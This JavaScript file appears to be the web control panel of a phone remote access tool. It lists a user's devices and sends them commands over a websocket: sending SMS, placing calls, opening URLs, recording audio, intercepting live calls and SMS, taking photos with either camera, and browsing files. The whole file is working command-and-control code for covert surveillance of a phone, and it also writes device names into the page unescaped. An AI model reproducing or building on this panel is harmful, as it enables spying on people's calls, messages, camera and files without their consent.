var createAlert = function (className, type, content, wait) {
    var alert = document.createElement('div');
    alert.className = 'alert ' + type + ' ' + className + ' fade in';
    document.getElementById('content').appendChild(alert);

    if (wait <= 0) {
        var close = document.createElement('p');
        close.className = 'close';
        close.onclick = function () {
            alert.remove();
        };
        close.textContent = 'x';
        close.style.cursor = 'pointer';
        alert.appendChild(close);
    } else setTimeout(function(){alert.remove()}, wait);

    var alertContent = document.createElement('div');
    alertContent.innerHTML = content;
    alert.appendChild(alertContent);

    return alert;
};

var send = function () {
    var deviceId = document.getElementById('deviceId');
    if (deviceId == null || (deviceId = deviceId.value) == "") {
        createAlert('alertError', 'alert-danger', "Please select a device from the left pane.", 3000);
        return;
    }
    var commands = document.getElementById('commands');
    var command = commands.options[commands.selectedIndex].value;
    if (command == null || command == "") {
        createAlert('alertError', 'alert-danger', "Please select a command", 3000);
        return;
    }

    var args;
    if ( (args = document.getElementById('args')) != null ) {

        if ((args = args.value) == "") {
            createAlert('alertError', 'alert-danger', "Please enter argument/s.", 3000);
            return;
        }

        if (args.indexOf(':') == -1)
            args += ":";
    }
    else args = "";

    if (command == "ClickPhoto") {
        args += document.querySelector('input[name = "cam"]:checked').value;
    }
    if (command == "FileManager") {
        args += "/:";
    }

    var commandJson = {
        "type": "command",
        "deviceId": document.getElementById('deviceId').value,
        "command": command,
        "args": args
    };
    wsClient.send(JSON.stringify(commandJson));

    var input = document.getElementById("camDiv");
    if (input != null)
        input.remove();
    input = document.getElementById("args");
    if (input != null)
        input.remove();

    createAlert('executing', 'alert-info', "Please wait while executing...", 0);
};

var sendFm = function (args) {
    try {
        var commandJson = {
            "type": 'command',
            "deviceId": document.getElementById('deviceId').value,
            "command": 'FileManager',
            "args": args
        };
        wsClient.send(JSON.stringify(commandJson));
    } catch (e) {
        console.log(e.data);
    }
};

var addIdToRequest = function(deviceId) {
    var form = document.forms['command_form'];
    var oldID = document.getElementById("deviceId");
    if (oldID != null)
        form.removeChild(oldID);
    var input = document.createElement('input');
    input.type = "hidden";
    input.id = "deviceId";
    input.name = "deviceId";
    input.value = deviceId;
    form.appendChild(input);
};

var createList = function(devices) {

    devices = devices.split('|');

    if (devices[0] == "" && devices[1] == "") {
        document.write("<p style='cursor: default; color: grey; text-align: left'>" +
            "There are no devices running with your id.</p>");
        return;
    }

    var device;

    if (devices[1] != "") {
        var onDevices = devices[1].split(',');
        onDevices.forEach(function (onDevice) {
            device = onDevice.substring(0, onDevice.indexOf("-"));
            document.write("<li id='onDevice' onClick='addIdToRequest(\"" + device + "\")'>" + onDevice + "</li>");
        });
        var list = $('ul li#onDevice');
        list.click(function () {
            list.removeClass('active');
            $(this).addClass('active');
        });
    }
    if (devices[0] != "") {
        var offDevices = devices[0].split(',');
        offDevices.forEach(function (offDevice) {
            device = offDevice.substring(0, offDevice.indexOf("-"));
            document.write(
                "<li class='disabled' style='color: red' " +
                "onClick='createAlert(\"alertError\", \"alert-danger\", \"" + offDevice + " is offline.\", 3000)'>"
                + offDevice + "</li>");
        });
    }
};

var addArgument = function (commands, command) {

    var set = new Set(["MakeToast", "SendSMS", "MakeCall", "OpenURL", "RecordAudio", "LiveCalls", "LiveSMS", "ClickPhoto"]);
    var camDiv;
    if ( (camDiv = document.getElementById("camDiv")) != null && command != "ClickPhoto") {
        camDiv.remove();
    }
    var argument = document.getElementById("args");
    if (set.has(command)) {
        if ( argument == null) {
            argument = document.createElement("input");
        }
        argument.type = 'text';
        argument.id = 'args';
        argument.name = 'arg';
        commands.parentNode.insertBefore(argument, commands.nextSibling);
    } else {
        if (argument != null)
            argument.remove();
        return;
    }

    switch(command) {
        case "MakeToast":
            argument.placeholder = "what message to toast?";
            break;

        case "SendSMS":
            argument.placeholder = "to(number)?:message?";
            break;
        
        case "MakeCall":
            argument.placeholder = "to(number)?";
            break;
        
        case "OpenURL":
            argument.placeholder = "website?";
            break;
        
        case "RecordAudio":
        case "LiveCalls":
        case "LiveSMS":
            argument.placeholder = "for how much time? (in mins)";
            break;

        case "ClickPhoto":
            argument.placeholder = "image quality? (%)";

            if (camDiv == null) {
                camDiv = document.createElement("div");
                camDiv.id = "camDiv";
                commands.parentNode.insertBefore(camDiv, commands.nextSibling);

                var radio = document.createElement("input");
                radio.type = "radio";
                radio.name = "cam";
                radio.value = 0;
                radio.checked = 1;
                var label = document.createElement("label");
                label.innerHTML = "Front cam";
                label.appendChild(radio);
                camDiv.appendChild(label);

                radio = document.createElement("input");
                radio.type = "radio";
                radio.name = "cam";
                radio.value = 1;
                label = document.createElement("label");
                label.innerHTML = "Back cam";
                label.appendChild(radio);
                camDiv.appendChild(label);
            }
            break;
    }
};
var update = function () {

    var form = document.createElement('form');
    form.id = 'updateForm';
    form.method = 'POST';
    form.action = 'client';

    var close = document.createElement('p');
    close.className = 'close';
    close.onclick = function () {
        form.remove();
    };
    close.innerText = 'x';
    close.style.cursor = 'pointer';
    form.appendChild(close);

    var input = document.createElement('input');
    input.type = 'password';
    input.placeholder = 'current password';
    input.name = 'password';
    input.required = true;
    form.appendChild(input);

    input = document.createElement('input');
    input.type = 'password';
    input.placeholder = 'new password';
    input.name = 'newPassword';
    input.required = true;
    input.setAttribute('aria-describedby', 'password-format');
    input.setAttribute('aria-required', 'true');
    input.setAttribute('pattern', '(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,72}');
    var span = document.createElement('span');
    span.id = 'password-format';
    span.className = 'help';
    span.innerText = 'Min Length: 8, 1 Upper case, 1 Lower case, 1 digit, 1 special character';
    input.appendChild(span);
    form.appendChild(input);

    input = document.createElement('input');
    input.type = 'password';
    input.placeholder = 'confirm new password';
    input.name = 'cNewPassword';
    input.required = true;
    form.appendChild(input);

    input = document.createElement('button');
    input.type = 'submit';
    input.innerText = 'update';
    form.appendChild(input);

    document.getElementById('content').appendChild(form);
};